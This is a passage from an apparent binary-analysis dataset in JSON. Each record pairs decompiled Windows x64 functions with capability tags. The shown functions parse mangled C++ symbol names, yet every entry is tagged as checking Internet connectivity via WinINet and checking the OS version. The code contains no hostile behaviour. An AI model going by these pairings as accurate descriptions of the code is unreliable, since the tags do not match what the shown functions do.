puVar9 = NULL;\n            uVar10 = 9;\n            break;\n        case 0x14000db9d:\n            *(arg1 + 0x48) = iVar6 + 10;\n            arg4 = fcn.14000b340(arg1);\n            puVar9 = NULL;\n            uVar10 = 10;\n            break;\n        case 0x14000dbbb:\n            arg4 = fcn.14000b340(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xd;\n            break;\n        case 0x14000dbd3:\n            arg4 = fcn.14000b340(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x12;\n        }\n    }\n    else {\n        if (*pcVar3 != 'G') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 1;\n        if (pcVar3[1] == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 2;\n        cVar1 = pcVar3[1];\n        if (cVar1 == 'T') {\n            if (pcVar3[2] == '\\0') {\ncode_r0x00014000dc00:\n                arg4 = fcn.14000e120(arg1, 0);\n            }\n            else {\n                *(arg1 + 0x18) = pcVar3 + 3;\n                cVar1 = pcVar3[3];\n                if (pcVar3[2] == 'n') {\n                    if ((cVar1 == 'G') || (cVar1 == 'T')) {\n                        arg4 = fcn.14000d6b0(arg1);\n                    }\n                    else {\n                        arg4 = fcn.14000e120(arg1, 0);\n                    }\n                    puVar9 = NULL;\n                    uVar10 = 0x4b;\n                    goto code_r0x00014000d8ba;\n                }\n                if ((cVar1 != 'G') && (cVar1 != 'T')) goto code_r0x00014000dc00;\n                arg4 = fcn.14000d6b0(arg1);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x4a;\n        }\n        else if (cVar1 < 'U') {\n            if (cVar1 == 'A') {\n                if ((pcVar3[2] == 'G') || (pcVar3[2] == 'T')) {\n                    arg4 = fcn.14000d6b0(arg1);\n                }\n                else {\n                    arg4 = fcn.14000e120(arg1, 0);\n                }\n                puVar9 = NULL;\n                uVar10 = 0x17;\n            }\n            else {\n                if (cVar1 != 'R') {\n                    return NULL;\n                }\n                arg4 = fcn.14000dcb0(arg1);\n                iVar6 = *(arg1 + 0x28);\n                if (iVar6 < *(arg1 + 0x2c)) {\n                    puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n                    *(puVar9 + 1) = 0;\n                    *(arg1 + 0x28) = iVar6 + 1;\n                    *puVar9 = 0x43;\n                    uVar7 = fcn.14000a7d0(arg1);\n                    puVar9[4] = uVar7;\n                }\n                else {\n                    puVar9 = NULL;\n                }\n                uVar10 = 0x16;\n            }\n        }\n        else {\n            if (cVar1 != 'V') {\n                if (cVar1 != 'r') {\n                    return NULL;\n                }\n                iVar6 = fcn.14000a7d0(arg1);\n                if (iVar6 < 2) {\n                    return NULL;\n                }\n                pcVar3 = *(arg1 + 0x18);\n                if (*pcVar3 == '\\0') {\n                    return NULL;\n                }\n                arg2 = pcVar3 + 1;\n                *(arg1 + 0x18) = arg2;\n                if (*pcVar3 != '_') {\n                    return NULL;\n                }\n                iVar6 = iVar6 + -1;\n                if (pcVar3[1] == '\\0') {\n                    return NULL;\n                }\n                if (pcVar3[1] != '$') {\n                    puVar9 = NULL;\n                    goto code_r0x00014000d806;\n                }\n                puVar9 = NULL;\n                do {\n                    cVar1 = arg2[1];\n                    if (cVar1 == 'S') {\n                        uVar7 = 0x2f;\n                    }\n                    else if (cVar1 == '_') {\n                        uVar7 = 0x2e;\n                    }\n                    else {\n                        uVar7 = 0x24;\n                        if (cVar1 != '$') {\n                            return NULL;\n                        }\n                    }\n                    iVar2 = *(arg1 + 0x28);\n                    arg2 = *(arg1 + 0x18) + 2;\n                    if (*(arg1 + 0x2c) <= iVar2) {\n                        *(arg1 + 0x18) = arg2;\n                        return NULL;\n                    }\n                    iVar6 = iVar6 + -2;\n                    arg4 = iVar2 * 0x20 + *(arg1 + 0x20);\n                    *(arg4 + 1) = 0;\n                    *(arg1 + 0x28) = iVar2 + 1;\n                    *arg4 = 0x42;\n                    arg4[4] = uVar7;\n                    *(arg1 + 0x18) = arg2;\n                    while( true ) {\n                        if ((puVar9 != NULL) && (arg4 = fcn.14000a670(arg1, 0x41, puVar9, arg4),  arg4 == NULL)) {\n                            return NULL;\n                        }\n                        if (iVar6 < 1) {\n                            puVar9 = NULL;\n                            uVar10 = 0x40;\n                            goto code_r0x00014000d8ba;\n                        }\n                        if (*arg2 == '\\0') {\n                            return NULL;\n                        }\n                        puVar9 = arg4;\n                        if (*arg2 == '$') break;\ncode_r0x00014000d806:\n                        uVar11 = 0;\n                        do {\n                            uVar10 = uVar11;\n                            if ((arg2[uVar11] == '\\0') || (arg2[uVar11] == '$')) {\n                                arg3 = uVar11 & 0xffffffff;\n                                goto code_r0x00014000d833;\n                            }\n                            uVar11 = uVar11 + 1;\n                        } while (uVar11 != iVar6);\n                        uVar10 = uVar10 + 1;\n                        arg3 = uVar10;\n                        uVar11 = uVar10;\ncode_r0x00014000d833:\n                        iVar6 = iVar6 - uVar10;\n                        arg4 = fcn.14000a770(arg1, arg2, arg3);\n                        arg2 = *(arg1 + 0x18) + uVar11;\n                        *(arg1 + 0x18) = arg2;\n                        if (arg4 == NULL) {\n                            return NULL;\n                        }\n                    }\n                } while( true );\n            }\n            arg4 = fcn.14000dcb0(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x13;\n        }\n    }\ncode_r0x00014000d8ba:\n    puVar4 = puVar9;\n    puVar5 = arg4;\n    if (uVar10 < 0x32) {\n        if (0x28 < uVar10) {\n            switch(uVar10) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x00014000a6a8;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000a74f:\n                if (arg4 == NULL) {\n                    return NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x00014000a703:\n                puVar5 = puVar4;\n                break;\n            default:\n                goto code_r0x00014000a707;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x00014000a6a1;\n        }\n        uVar11 = 1 << (uVar10 & 0x3f);\n        if ((uVar11 & 0x17c00fff600) != 0) goto joined_r0x00014000a6a1;\n        if ((uVar11 & 0x1fe000000) == 0) {\n            if ((uVar11 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000a74f;\n        }\n    }\n    else {\n        if (0x1d < uVar10 - 0x34) {\n            return NULL;\n        }\n        uVar11 = 1 << (uVar10 - 0x34 & 0x3f);\n        if ((uVar11 & 0x1c71107) == 0) {\n            if ((uVar11 & 0xa002ef8) != 0) goto code_r0x00014000a74f;\n            puVar4 = uVar11 & 0x34000000;\n            goto joined_r0x00014000a703;\n        }\njoined_r0x00014000a6a1:\n        if (puVar5 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x00014000a6a8:\n    iVar6 = *(arg1 + 0x28);\n    if (iVar6 < *(arg1 + 0x2c)) {\n        puVar8 = iVar6 * 0x20 + *(arg1 + 0x20);\n        *(puVar8 + 1) = 0;\n        *(arg1 + 0x28) = iVar6 + 1;\n        *puVar8 = uVar10;\n        *(puVar8 + 4) = arg4;\n        *(puVar8 + 6) = puVar9;\n        return puVar8;\n    }\ncode_r0x00014000a707:\n    return NULL;\n}\n",
        "token_count": 3531
    },
    "14000dcb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * fcn.14000dcb0(int64_t arg1)\n\n{\n    uint uVar1;\n    uint32_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t *puVar7;\n    ulong arg4;\n    uint32_t *puVar8;\n    ulong uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    char *pcVar12;\n    uint32_t *puVar13;\n    int32_t *piVar14;\n    char *pcVar15;\n    char *pcVar16;\n    uint *arg3;\n    uint32_t *apuStack48 [2];\n    \n    pcVar12 = *(arg1 + 0x18);\n    cVar3 = *pcVar12;\n    if (cVar3 == 'U') {\n        pcVar12 = *(arg1 + 0x18);\n        cVar3 = *pcVar12;\n        if (cVar3 - 0x30U < 10) {\n            puVar8 = fcn.14000aff0(arg1);\n            cVar3 = **(arg1 + 0x18);\n            pcVar15 = *(arg1 + 0x18);\n            goto joined_r0x00014000c325;\n        }\n        if (cVar3 + 0x9fU < 0x1a) {\n            uVar1 = *(arg1 + 0x4c);\n            if ((cVar3 == 'o') && (pcVar12[1] == 'n')) {\n                *(arg1 + 0x4c) = 0;\n                *(arg1 + 0x18) = pcVar12 + 2;\n            }\n            puVar8 = fcn.14000c020(arg1);\n            *(arg1 + 0x4c) = uVar1;\n            if ((puVar8 != NULL) && (*puVar8 == 0x32)) {\n                pcVar12 = **(puVar8 + 4);\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 7 + *(*(puVar8 + 4) + 2);\n                if ((*pcVar12 == 'l') && ((pcVar12[1] == 'i' && (pcVar12[2] == '\\0')))) {\n                    uVar9 = fcn.14000aff0(arg1);\n                    puVar8 = fcn.14000a670(arg1, 0x37, puVar8, uVar9);\n                }\n            }\ncode_r0x00014000c20c:\n            cVar3 = **(arg1 + 0x18);\n            pcVar15 = *(arg1 + 0x18);\n            goto joined_r0x00014000c325;\n        }\n        if (cVar3 + 0xbdU < 2) {\n            piVar14 = *(arg1 + 0x40);\n            if ((piVar14 == NULL) || ((*piVar14 != 0 && (*piVar14 != 0x18)))) {\n                if (cVar3 != 'C') goto code_r0x00014000c43d;\n            }\n            else {\n                *(arg1 + 0x48) = piVar14[6] + *(arg1 + 0x48);\n                cVar3 = *pcVar12;\n                if (cVar3 != 'C') {\n                    if (cVar3 != 'D') {\ncode_r0x00014000c47d:\n                        puVar8 = NULL;\n                        pcVar15 = pcVar12;\n                        goto joined_r0x00014000c325;\n                    }\ncode_r0x00014000c43d:\n                    if (pcVar12[1] - 0x30U < 6) {\n                        switch(*((pcVar12[1] - 0x30U) * 4 + 0x14010c45c) + 0x14010c45c) {\n                        case 0x14000c484:\n                            uVar5 = 2;\n                            break;\n                        case 0x14000c4e0:\n                            uVar5 = 5;\n                            break;\n                        case 0x14000c4e7:\n                            uVar5 = 4;\n                            break;\n                        case 0x14000c4ee:\n                            uVar5 = 3;\n                            break;\n                        case 0x14000c4f5:\n                            uVar5 = 1;\n                            break;\n                        case 0x14000c4fc:\n                            goto code_r0x00014000c4fc;\n                        }\n                        pcVar15 = pcVar12 + 2;\n                        iVar4 = *(arg1 + 0x28);\n                        *(arg1 + 0x18) = pcVar15;\n                        if (iVar4 < *(arg1 + 0x2c)) {\n                            puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                            *(puVar8 + 1) = 0;\n                            *(arg1 + 0x28) = iVar4 + 1;\n                            if (piVar14 != NULL) {\n                                *(puVar8 + 1) = 0;\n                                *puVar8 = 8;\n                                puVar8[4] = uVar5;\n                                *(puVar8 + 6) = piVar14;\n                                cVar3 = pcVar12[2];\n                                goto joined_r0x00014000c325;\n                            }\n                        }\n                        cVar3 = pcVar12[2];\n                        puVar8 = NULL;\n                    }\n                    else {\ncode_r0x00014000c4fc:\n                        puVar8 = NULL;\n                        pcVar15 = pcVar12;\n                    }\n                    goto joined_r0x00014000c325;\n                }\n            }\n            cVar3 = pcVar12[1];\n            if (cVar3 == 'I') {\n                pcVar15 = pcVar12 + 1;\n                *(arg1 + 0x18) = pcVar15;\n                cVar3 = pcVar12[2];\n                if (4 < cVar3 - 0x31U) {\n                    cVar3 = pcVar12[1];\n                    puVar8 = NULL;\n                    goto joined_r0x00014000c325;\n                }\n                *(arg1 + 0x18) = pcVar12 + 3;\n                fcn.14000b340(arg1);\n                piVar14 = *(arg1 + 0x40);\n                pcVar15 = *(arg1 + 0x18);\n            }\n            else {\n                if (4 < cVar3 - 0x31U) {\n                    return NULL;\n                }\n                pcVar15 = pcVar12 + 2;\n                *(arg1 + 0x18) = pcVar15;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (iVar4 < *(arg1 + 0x2c)) {\n                puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                *(puVar8 + 1) = 0;\n                *(arg1 + 0x28) = iVar4 + 1;\n                if (piVar14 != NULL) {\n                    *(puVar8 + 1) = 0;\n                    *puVar8 = 7;\n                    puVar8[4] = cVar3 - 0x30;\n                    *(puVar8 + 6) = piVar14;\n                    cVar3 = *pcVar15;\n                    goto joined_r0x00014000c325;\n                }\n            }\n        }\n        else {\n            if (cVar3 == 'L') {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                puVar8 = fcn.14000aff0(arg1);\n                if (puVar8 == NULL) {\n                    return NULL;\n                }\n                iVar4 = fcn.14000a970(arg1);\n                if (iVar4 == 0) {\n                    return NULL;\n                }\n                goto code_r0x00014000c20c;\n            }\n            if (cVar3 != 'U') {\n                return NULL;\n            }\n            if (pcVar12[1] == 'l') {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                cVar3 = pcVar12[1];\n                if (cVar3 != 'l') goto code_r0x00014000c5d0;\n                *(arg1 + 0x18) = pcVar12 + 2;\n                iVar11 = fcn.14000be10(arg1);\n                pcVar12 = *(arg1 + 0x18);\n                cVar3 = *pcVar12;\n                if ((iVar11 == 0) || (cVar3 != 'E')) goto code_r0x00014000c47d;\n                pcVar16 = pcVar12 + 1;\n                *(arg1 + 0x18) = pcVar16;\n                if (pcVar12[1] == '_') {\n                    uVar5 = 0;\n                }\n                else {\n                    if (pcVar12[1] == 'n') {\n                        return NULL;\n                    }\n                    iVar4 = fcn.14000a7d0(arg1);\n                    uVar5 = iVar4 + 1;\n                    if (uVar5 < 0) goto code_r0x00014000c691;\n                    pcVar16 = *(arg1 + 0x18);\n                    cVar3 = *pcVar16;\n                    if (cVar3 != '_') goto code_r0x00014000c6bb;\n                }\n                pcVar15 = pcVar16 + 1;\n                iVar4 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar15;\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(puVar8 + 1) = 0;\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    *puVar8 = 0x47;\n                    *(puVar8 + 4) = iVar11;\n                    puVar8[6] = uVar5;\n                    cVar3 = pcVar16[1];\n                    goto joined_r0x00014000c325;\n                }\ncode_r0x00014000c677:\n                cVar3 = pcVar16[1];\n                puVar8 = NULL;\n                goto joined_r0x00014000c325;\n            }\n            if (pcVar12[1] != 't') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = pcVar12 + 1;\n            cVar3 = pcVar12[1];\n            if (cVar3 != 't') {\ncode_r0x00014000c5d0:\n                puVar8 = NULL;\n                pcVar15 = pcVar12 + 1;\n                goto joined_r0x00014000c325;\n            }\n            pcVar16 = pcVar12 + 2;\n            *(arg1 + 0x18) = pcVar16;\n            if (pcVar12[2] == '_') {\n                uVar5 = 0;\ncode_r0x00014000c2b3:\n                pcVar15 = pcVar16 + 1;\n                iVar4 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar15;\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(puVar8 + 1) = 0;\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    puVar8[4] = uVar5;\n                    iVar4 = *(arg1 + 0x38);\n                    *puVar8 = 0x49;\n                    if (iVar4 < *(arg1 + 0x3c)) {\n                        *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n                        *(arg1 + 0x38) = iVar4 + 1;\n                        cVar3 = pcVar16[1];\n                        goto joined_r0x00014000c325;\n                    }\n                }\n                goto code_r0x00014000c677;\n            }\n            if (pcVar12[2] == 'n') {\n                return NULL;\n            }\n            iVar4 = fcn.14000a7d0(arg1);\n            uVar5 = iVar4 + 1;\n            if (-1 < uVar5) {\n                pcVar16 = *(arg1 + 0x18);\n                cVar3 = *pcVar16;\n                if (cVar3 != '_') {\ncode_r0x00014000c6bb:\n                    puVar8 = NULL;\n                    pcVar15 = pcVar16;\n                    goto joined_r0x00014000c325;\n                }\n                goto code_r0x00014000c2b3;\n            }\ncode_r0x00014000c691:\n            pcVar15 = *(arg1 + 0x18);\n        }\n        cVar3 = *pcVar15;\n        puVar8 = NULL;\njoined_r0x00014000c325:\n        if (cVar3 == 'B') {\n            uVar9 = *(arg1 + 0x40);\n            do {\n                *(arg1 + 0x18) = pcVar15 + 1;\n                arg4 = fcn.14000aff0(arg1);\n                puVar8 = fcn.14000a670(arg1, 0x4d, puVar8, arg4);\n                pcVar15 = *(arg1 + 0x18);\n            } while (*pcVar15 == 'B');\n            *(arg1 + 0x40) = uVar9;\n            return puVar8;\n        }\n        return puVar8;\n    }\n    if (cVar3 < 'V') {\n        if (cVar3 == 'N') {\n            *(arg1 + 0x18) = pcVar12 + 1;\n            piVar10 = fcn.14000d470(arg1, apuStack48, 1);\n            if (piVar10 == NULL) {\n                return NULL;\n            }\n            puVar8 = fcn.14000a910(arg1, 0);\n            iVar11 = fcn.14000ca00(arg1, 1);\n            *piVar10 = iVar11;\n            if (iVar11 != 0) {\n                if (puVar8 != NULL) {\n                    *(puVar8 + 4) = apuStack48[0];\n                    apuStack48[0] = puVar8;\n                }\n                if (**(arg1 + 0x18) == 'E') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    return apuStack48[0];\n                }\n                return NULL;\n            }\n            return NULL;\n        }\n        if (cVar3 == 'S') {\n            if (pcVar12[1] == 't') {\n                *(arg1 + 0x18) = pcVar12 + 2;\n                uVar9 = fcn.14000c1c0(arg1);\n                iVar4 = *(arg1 + 0x28);\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    arg3 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    *(arg3 + 1) = 0;\n                    *arg3 = 0;\n                    *(arg3 + 4) = 0x14010c69b;\n                    arg3[6] = 3;\n                }\n                else {\n                    arg3 = NULL;\n                }\n                puVar8 = fcn.14000a670(arg1, 1, arg3, uVar9);\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 3;\n                pcVar12 = *(arg1 + 0x18);\n                if (*pcVar12 != 'I') {\n                    return puVar8;\n                }\n                if (puVar8 == NULL) {\n                    return NULL;\n                }\n                iVar4 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar4) {\n                    return NULL;\n                }\n                *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n                *(arg1 + 0x38) = iVar4 + 1;\n                if (1 < *pcVar12 + 0xb7U) {\n                    puVar13 = NULL;\n                    goto code_r0x00014000dfa3;\n                }\n            }\n            else {\n                puVar8 = fcn.14000b0f0(arg1, 0);\n                pcVar12 = *(arg1 + 0x18);\n                if (*pcVar12 != 'I') {\n                    return puVar8;\n                }\n            }\n            *(arg1 + 0x18) = pcVar12 + 1;\n            puVar13 = fcn.14000c950(arg1);\n        }\n        else {\ncode_r0x00014000ddc0:\n            puVar8 = fcn.14000c1c0(arg1);\n            pcVar12 = *(arg1 + 0x18);\n            if (*pcVar12 != 'I') {\n                return puVar8;\n            }\n            if ((puVar8 == NULL) || (iVar4 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar4)) {\n                return NULL;\n            }\n            puVar13 = NULL;\n            *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n            *(arg1 + 0x38) = iVar4 + 1;\n            if (*pcVar12 + 0xb7U < 2) {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                puVar13 = fcn.14000c950(arg1);\n            }\n        }\ncode_r0x00014000dfa3:\n        uVar5 = 4;\n    }\n    else {\n        if (cVar3 != 'Z') goto code_r0x00014000ddc0;\n        *(arg1 + 0x18) = pcVar12 + 1;\n        if ((pcVar12[1] == 'G') || (pcVar12[1] == 'T')) {\n            puVar8 = fcn.14000d6b0(arg1);\n        }\n        else {\n            puVar8 = fcn.14000e120(arg1, 0);\n        }\n        if (puVar8 == NULL) {\n            return NULL;\n        }\n        pcVar12 = *(arg1 + 0x18);\n        if (*pcVar12 != 'E') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar12 + 1;\n        if (pcVar12[1] == 's') {\n            *(arg1 + 0x18) = pcVar12 + 2;\n            iVar4 = fcn.14000a970(arg1);\n            if (iVar4 == 0) {\n                return NULL;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar4) goto code_r0x00014000e080;\n            *(arg1 + 0x28) = iVar4 + 1;\n            puVar13 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(puVar13 + 1) = 0;\n            *puVar13 = 0;\n            *(puVar13 + 4) = \"string literal\";\n            puVar13[6] = 0xe;\n        }\n        else if (pcVar12[1] == 'd') {\n            pcVar15 = pcVar12 + 2;\n            *(arg1 + 0x18) = pcVar15;\n            if (pcVar12[2] == '_') {\n                uVar5 = 0;\n            }\n            else {\n                if (pcVar12[2] == 'n') {\n                    return NULL;\n                }\n                iVar4 = fcn.14000a7d0(arg1);\n                uVar5 = iVar4 + 1;\n                if (uVar5 < 0) {\n                    return NULL;\n                }\n                pcVar15 = *(arg1 + 0x18);\n                if (*pcVar15 != '_') {\n                    return NULL;\n                }\n            }\n            *(arg1 + 0x18) = pcVar15 + 1;\n            piVar14 = fcn.14000dcb0(arg1);\n            if (((piVar14 != NULL) && ((*piVar14 - 0x47U & 0xfffffffd) != 0)) &&\n               (iVar4 = fcn.14000a970(arg1),  iVar4 == 0)) {\n                return NULL;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar4) goto code_r0x00014000e080;\n            puVar13 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(puVar13 + 1) = 0;\n            *(arg1 + 0x28) = iVar4 + 1;\n            *puVar13 = 0x48;\n            puVar13[6] = uVar5;\n            *(puVar13 + 4) = piVar14;\n        }\n        else {\n            puVar13 = fcn.14000dcb0(arg1);\n            if (puVar13 == NULL) {\ncode_r0x00014000e080:\n                puVar13 = NULL;\n            }\n            else if (((*puVar13 - 0x47 & 0xfffffffd) != 0) && (iVar4 = fcn.14000a970(arg1),  iVar4 == 0)) {\n                return NULL;\n            }\n        }\n        if ((*puVar8 == 3) && (**(puVar8 + 6) == 0x29)) {\n            *(*(puVar8 + 6) + 4) = 0;\n        }\n        uVar5 = 2;\n    }\n    puVar7 = puVar13;\n    puVar2 = puVar8;\n    if (uVar5 < 0x32) {\n        if (0x28 < uVar5) {\n            switch(uVar5) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x00014000a6a8;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000a74f:\n                if (puVar8 == NULL) {\n                    return NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x00014000a703:\n                puVar2 = puVar7;\n                break;\n            default:\n                goto code_r0x00014000a707;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x00014000a6a1;\n        }\n        uVar6 = 1 << uVar5;\n        if ((uVar6 & 0x17c00fff600) != 0) goto joined_r0x00014000a6a1;\n        if ((uVar6 & 0x1fe000000) == 0) {\n            if ((uVar6 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000a74f;\n        }\n    }\n    else {\n        if (0x1d < uVar5 - 0x34) {\n            return NULL;\n        }\n        uVar6 = 1 << (uVar5 - 0x34 & 0x3f);\n        if ((uVar6 & 0x1c71107) == 0) {\n            if ((uVar6 & 0xa002ef8) != 0) goto code_r0x00014000a74f;\n            puVar7 = uVar6 & 0x34000000;\n            goto joined_r0x00014000a703;\n        }\njoined_r0x00014000a6a1:\n        if (puVar2 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x00014000a6a8:\n    iVar4 = *(arg1 + 0x28);\n    if (iVar4 < *(arg1 + 0x2c)) {\n        puVar7 = iVar4 * 0x20 + *(arg1 + 0x20);\n        *(puVar7 + 1) = 0;\n        *(arg1 + 0x28) = iVar4 + 1;\n        *puVar7 = uVar5;\n        *(puVar7 + 4) = puVar8;\n        *(puVar7 + 6) = puVar13;\n        return puVar7;\n    }\ncode_r0x00014000a707:\n    return NULL;\n}\n",
        "token_count": 5620
    },
    "14000e12": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000a6e0)\n// WARNING: Removing unreachable block (ram,0x00014000a710)\n// WARNING: Removing unreachable block (ram,0x00014000a718)\n// WARNING: Removing unreachable block (ram,0x00014000a6e8)\n// WARNING: Removing unreachable block (ram,0x00014000a6f7)\n// WARNING: Removing unreachable block (ram,0x00014000a6fe)\n// WARNING: Removing unreachable block (ram,0x00014000a69e)\n// WARNING: Removing unreachable block (ram,0x00014000a6a3)\n\nuint32_t * fcn.14000e120(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t *piVar5;\n    uint64_t arg2_00;\n    \n    puVar4 = fcn.14000dcb0(arg1);\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    if ((arg2 != 0) && ((*(arg1 + 0x10) & 1) == 0)) {\n        while( true ) {\n            uVar2 = *puVar4 - 0x1c;\n            if (0x35 < uVar2) {\n                if (*puVar4 != 2) {\n                    return puVar4;\n                }\n                piVar5 = *(puVar4 + 6);\n                while( true ) {\n                    if (piVar5 == NULL) {\n                        return NULL;\n                    }\n                    if (0x35 < *piVar5 - 0x1cU) break;\n                    if ((0x3400000000001fU >> (*piVar5 - 0x1cU & 0x3f) & 1) == 0) {\n                        return puVar4;\n                    }\n                    piVar5 = *(piVar5 + 4);\n                    *(puVar4 + 6) = piVar5;\n                }\n                return puVar4;\n            }\n            if ((0x3400000000001fU >> (uVar2 & 0x3f) & 1) == 0) break;\n            puVar4 = *(puVar4 + 4);\n        }\n        return puVar4;\n    }\n    if ((**(arg1 + 0x18) == '\\0') || (puVar3 = puVar4,  **(arg1 + 0x18) == 'E')) {\n        return puVar4;\n    }\n    do {\n        uVar2 = *puVar3;\n        if (uVar2 == 4) {\n            puVar3 = *(puVar3 + 4);\n            goto joined_r0x00014000e277;\n        }\n        if (uVar2 < 5) {\n            if (uVar2 != 2) break;\n            puVar3 = *(puVar3 + 6);\n        }\n        else {\n            if ((0x35 < uVar2 - 0x1c) || ((0x3400000000001fU >> (uVar2 - 0x1c & 0x3f) & 1) == 0)) break;\n            puVar3 = *(puVar3 + 4);\n        }\n    } while (puVar3 != NULL);\ncode_r0x00014000e1af:\n    arg2_00 = 0;\ncode_r0x00014000e1b1:\n    piVar5 = fcn.14000bef0(arg1, arg2_00);\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if (((arg2 == 0) && (*puVar4 == 2)) && (*piVar5 == 0x29)) {\n        *(piVar5 + 4) = 0;\n    }\n    if (((puVar4 != NULL) && (piVar5 != NULL)) && (iVar1 = *(arg1 + 0x28),  iVar1 < *(arg1 + 0x2c))) {\n        puVar3 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar3 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        *puVar3 = 3;\n        *(puVar3 + 4) = puVar4;\n        *(puVar3 + 6) = piVar5;\n        return puVar3;\n    }\n    return NULL;\njoined_r0x00014000e277:\n    if (puVar3 == NULL) goto code_r0x00014000e2a0;\n    uVar2 = *puVar3;\n    if (8 < uVar2) {\n        arg2_00 = uVar2 != 0x35;\n        goto code_r0x00014000e1b1;\n    }\n    if (6 < uVar2) goto code_r0x00014000e1af;\n    if (1 < uVar2 - 1) goto code_r0x00014000e2a0;\n    puVar3 = *(puVar3 + 6);\n    goto joined_r0x00014000e277;\ncode_r0x00014000e2a0:\n    arg2_00 = 1;\n    goto code_r0x00014000e1b1;\n}\n",
        "token_count": 1206
    },
    "1400113f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400113f0(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    if (((arg3 != 0) && (*(arg3 + 4) < 2)) && (iVar1 = *(arg1 + 0x134),  iVar1 < 0x401)) {\n        *(arg3 + 4) = *(arg3 + 4) + 1;\n        uStack32 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar1 + 1;\n        *(arg1 + 0x148) = &iStack40;\n        iStack40 = arg3;\n        fcn.14000e2e0(arg1, 0x11, arg3);\n        *(arg1 + 0x148) = uStack32;\n        *(arg3 + 4) = *(arg3 + 4) + -1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\n}\n",
        "token_count": 274
    },
    "1400127b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
